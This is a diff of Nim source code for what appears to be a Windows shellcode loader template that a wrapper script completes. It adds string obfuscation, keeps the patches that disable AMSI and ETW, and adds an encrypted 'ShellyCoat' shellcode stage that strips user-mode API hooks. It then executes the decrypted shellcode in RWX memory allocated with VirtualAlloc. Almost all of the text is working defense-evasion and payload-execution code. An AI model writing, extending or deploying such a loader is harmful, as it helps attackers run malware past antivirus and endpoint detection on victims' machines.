@@ -22,17 +22,39 @@ import winim/clr except `[]`
 import strformat
 import os
 import dynlib
-import strenc
 import base64
+
+### Modified code from Nim-Strenc to avoid XORing of long strings
+### Original source: https://github.com/Yardanico/nim-strenc
+import macros, hashes
+
+type
+    estring = distinct string
+
+proc fWorgaKn0rg(s: estring, key: int): string {.noinline.} =
+    var k = key
+    result = string(s)
+    for i in 0 ..< result.len:
+        for f in [0, 8, 16, 24]:
+            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
+    k = k +% 1
+
+var encodedCounter {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF
+
+macro encrypt*{s}(s: string{lit}): untyped =
+    if len($s) < 1000:
+        var encodedStr = fWorgaKn0rg(estring($s), encodedCounter)
+        result = quote do:
+            fWorgaKn0rg(estring(`encodedStr`), `encodedCounter`)
+        encodedCounter = (encodedCounter *% 16777619) and 0x7FFFFFFF
+    else:
+        result = s
 
 # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
 #[ PLACEHOLDERCRYPTKEY ]#
 
 # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let verbose = false
 #[ PLACEHOLDERVERBOSE ]#
-
-# Define a distinct string type for the payload (which will not be XOR'd)
-type noCryptString = string
 
 # Get the AMSI patch bytes based on arch
 when defined amd64:
@@ -82,6 +104,21 @@ when isMainModule:
 
     var success : bool
 
+    func toByteSeq*(str: string): seq[byte] {.inline.} =
+        @(str.toOpenArrayByte(0, str.high))
+
+    #[
+        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
+        let b64buf = "ZXhhbXBsZQo="
+        let cryptedCoat = ""
+        let cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]
+
+        (key is defined separately as a const to prevent the values from being too close together)
+    ]#
+    #[ PLACEHOLDERCRYPTEDINPUT ]#
+    #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
+    #[ PLACEHOLDERCRYPTIV ]#
+
     if optionPatchAmsi:
         # Patch AMSI
         success = PatchAmsi()
@@ -100,34 +137,50 @@ when isMainModule:
         if verbose:
             echo fmt"[*] ETW disabled: {bool(success)}"
 
-    #[
-        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
-        let b64buf : noCryptString = "ZXhhbXBsZQo="
-        let cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]
-
-        (key is defined separately as a const to prevent the values from being too close together)
-    ]#
-    #[ PLACEHOLDERCRYPTEDINPUT ]#
-    #[ PLACEHOLDERCRYPTIV ]#
-
-    # Decrypt the encrypted bytes
-    func toByteSeq*(str: string): seq[byte] {.inline.} =
-        @(str.toOpenArrayByte(0, str.high))
-
+    # Prepare decryption stuff
     let cryptedInput = toByteSeq(decode(b64buf))
-
+    
     var
         dctx: CTR[aes128]
         key : array[aes128.sizeKey, byte]
         iv : array[aes128.sizeBlock, byte]
-        encoded = newSeq[byte](len(cryptedInput))
-        decoded = newSeq[byte](len(cryptedInput))
+        encodedPay = newSeq[byte](len(cryptedInput))
+        decodedPay = newSeq[byte](len(cryptedInput))
 
     key = cryptKey
     iv = cryptIV
-    encoded = cryptedInput
-
-    dctx.init(key, iv)
-    dctx.decrypt(encoded, decoded)
-    dctx.clear()
+    encodedPay = cryptedInput
     
+    # Run shellcode using VirtualAlloc()
+    proc rscva(payload: openArray[byte]): void =
+        var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        if verbose:
+            doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
+        copyMem(allocated, payload[0].unsafeAddr, len(payload))
+        let f = cast[proc(){.nimcall.}](allocated)
+        f()
+
+    if cryptedCoat != "":
+        # Decrypt ShellyCoat shellcode
+        let cryptedCoatBytes = toByteSeq(decode(cryptedCoat))
+
+        var
+            encodedCoat = newSeq[byte](len(cryptedCoatBytes))
+            decodedCoat = newSeq[byte](len(cryptedCoatBytes))
+
+        encodedCoat = cryptedCoatBytes
+        dctx.init(key, iv)
+        dctx.decrypt(encodedCoat, decodedCoat)
+        dctx.clear()
+
+        # Remove user-mode API hooks by running ShellyCoat shellcode
+        rscva(decodedCoat)
+        if verbose:
+            echo "[*] User-mode API hooks removed: true"
+            
+
+    # Decrypt the encrypted bytes of the main payload
+    var dctx2: CTR[aes128]
+    dctx2.init(key, iv)
+    dctx2.decrypt(encodedPay, decodedPay)
+    dctx2.clear()
